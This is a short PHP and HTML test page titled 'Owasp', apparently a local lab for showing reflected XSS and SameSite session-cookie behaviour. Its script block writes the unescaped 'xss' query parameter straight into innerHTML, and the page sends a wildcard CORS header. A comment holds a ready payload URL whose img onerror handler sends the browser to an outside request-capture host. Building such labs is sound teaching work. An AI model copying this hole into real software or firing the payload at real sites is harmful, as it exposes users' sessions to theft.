<?php 
    $sess_name = session_name();
    session_start();
    header("Access-Control-Allow-Origin: *");
?>
<!-- http://localhost:8080/session/same_site_cookie.php?xss=%60%3Cimg%20src=vo%20onerror=%22window.location=%27https://security.free.beeceptor.com%27%22%3E%27 -->
<!DOCTYPE html>
<html>
<head>
  <title>Owasp</title>
  <script type="text/javascript" src="./axios.js"></script>
</head>
<body>
<div id="test">
</div>

</body>
</html>
</style>

<script>
    window.document.getElementById('test').innerHTML = <?php echo $_GET['xss'] ?>
</script>
